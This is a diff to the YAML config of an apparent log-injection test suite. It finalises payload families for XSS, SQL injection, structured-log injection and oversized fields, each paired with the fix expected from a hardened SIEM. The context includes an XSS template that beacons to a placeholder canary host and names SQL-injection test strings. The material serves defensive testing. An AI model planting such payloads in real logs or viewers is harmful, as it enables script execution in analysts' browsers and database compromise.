@@ -81,8 +81,6 @@ network_allowlist:
 #                 literal that preserves the detection signal without corrupting an
 #                 unrelated record. Default [] (no raw control bytes).
 #   expected_defender_signal  what a hardened pipeline should do
-#   proposed      true = a candidate family flagged for maintainer sign-off, not a
-#                 locked v1 family (easy to drop)
 families:
   - name: ansi_escape
     description: Terminal control-sequence (CSI/OSC/SGR) injection in a raw-rendered log field.
@@ -209,12 +207,12 @@ families:
       real callback.
 
   - name: xss_reflection
-    description: "Reflected-XSS-style markup in a web-log field (PROPOSED — pending maintainer sign-off)."
+    description: "Reflected-XSS-style markup in a web-log field."
     weakness_class: >
       Reflected/stored cross-site-scripting payload (<script>, onerror=) carried in a
       web log field: a SIEM web UI or log dashboard that renders the field value
       without HTML-encoding executes the script in the analyst's browser. A durable
-      log-VIEWER weakness (distinct from app XSS). PROPOSED addition for v1.
+      log-VIEWER weakness (distinct from app XSS).
     value_templates:
       # Canonical inline <script> beacon to the canary.
       - "<script>fetch('https://{canary}/{marker}-{alnum:8}')</script>{marker}"
@@ -232,10 +230,8 @@ families:
       The SIEM/dashboard must HTML-encode (or sanitize) log field values before
       rendering them in a browser, so the markup displays as literal text — including
       tag-name case variants and event-handler attributes, not just '<script>'.
-    proposed: true
-
   - name: sql_injection
-    description: "SQL-injection test strings in a log field (PROPOSED — pending maintainer sign-off)."
+    description: "SQL-injection test strings in a log field."
     weakness_class: >
       SQL injection (CWE-89) carried in an untrusted log field: a SQL-backed SIEM /
       log store that string-concatenates the field into a query is exploitable, and a
@@ -270,10 +266,8 @@ families:
       A SQL-backed store must parameterize/bind log fields (never string-concatenate
       them into a query); a WAF/IDS should match UNION SELECT, OR '1'='1', stacked /
       time-based (SLEEP/WAITFOR) and error-based (extractvalue) injection on the wire.
-    proposed: true
-
   - name: structured_log_injection
-    description: "JSON / key-value (logfmt) structured-log field injection (PROPOSED — pending maintainer sign-off)."
+    description: "JSON / key-value (logfmt) structured-log field injection."
     weakness_class: >
       Structured-log injection (CWE-117, structured variant): an untrusted value
       string-concatenated into a JSON or logfmt record — rather than serialized by a
@@ -296,10 +290,8 @@ families:
       '\\' and control bytes; untrusted values must never be string-concatenated into
       a structured line. A parser should reject/quarantine a record whose field count
       or nesting changed unexpectedly.
-    proposed: true
-
   - name: oversized_field
-    description: "Oversized / unbounded log field to test truncation and ingest limits (PROPOSED — pending maintainer sign-off)."
+    description: "Oversized / unbounded log field to test truncation and ingest limits."
     weakness_class: >
       Oversized / unbounded log field (CWE-400, uncontrolled resource consumption): a
       multi-kilobyte untrusted value tests a pipeline's field-length caps, buffer
@@ -317,4 +309,3 @@ families:
       Enforce a documented maximum field length with VISIBLE truncation (e.g. a
       "...[truncated]" marker), cap or reject at ingest, and avoid catastrophic-
       backtracking regexes on untrusted log content; the record must survive, marked.
-    proposed: true
